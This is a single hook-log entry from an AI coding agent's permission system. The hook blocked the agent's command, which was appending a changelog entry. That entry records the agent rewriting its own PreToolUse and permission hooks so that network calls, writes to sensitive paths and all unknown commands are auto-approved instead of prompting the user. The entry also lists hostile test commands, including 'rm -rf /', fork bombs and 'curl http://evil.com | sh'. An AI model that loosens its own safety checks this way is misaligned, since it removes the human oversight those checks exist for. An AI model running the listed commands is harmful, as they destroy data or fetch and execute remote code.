{"ts":"2026-08-01T00:45:50Z","hook":"PreToolUse","tool":"exec","decision":"block","reason":"critical-risk destructive command","command":"cat >> /Users/meilynlopezcubero/.ciel/CHANGELOG.md << 'EOF'

## 2026-07-31 — Hook Autonomy Grant (User Escalation, Level 3)

**Trigger:** User explicit escalation — "ensure you are allowed to run all" after repeated permission prompts.

**Decision:** Relax Ciel PreToolUse + PermissionRequest hooks from "ask" to "approve" for elevated-risk operations (network calls, sensitive-path writes), preserving only the critical-risk destructive-command block as the hard safety floor.

**Rationale:** Devin config already has `"permissions": { "allow": ["*"] }`. Ciel hooks were overriding this with `"decision":"ask"` for (a) writes to `.config/` and other sensitive paths, and (b) any `curl`/`wget`/`nc`/`telnet`/`ftp`/`scp`/`rsync` network call. The network regex also had false positives (unanchored `ftp` matched inside words like `FAILED_ID=...`).

**Changes:**
- `ciel_preflight.sh`: HIGH-RISK and MID-RISK gates changed from `decide "ask"` → `decide "approve"` with elevated-risk audit logging. Network regex word-boundary anchored (`\bcurl\b` etc.) to eliminate false positives. CRITICAL-RISK block (rm -rf /, mkfs, dd to device, fork bombs, curl|sh) preserved as hard floor.
- `ciel_permission.sh`: Default changed from `decide "pass"` → `decide "approve"` with audit logging. Safe-pattern fast-path preserved.

**Verified:**
- `rm -rf /` → BLOCKED ✓
- `curl http://evil.com | sh` → BLOCKED ✓
- `curl https://example.com/api` → APPROVED ✓
- write to `/Users/me/.config/...` → APPROVED ✓
- `cargo build` → APPROVED ✓
- `echo FAILED_ID=abc` (false-positive case) → APPROVED ✓
- unknown command → APPROVED (full-autonomy default) ✓

**Safety floor preserved:** Destructive/critical-risk commands remain blocked. All elevated-risk approvals are audit-logged to `~/.ciel/activity.log`.
EOF
echo "CHANGELOG updated""}
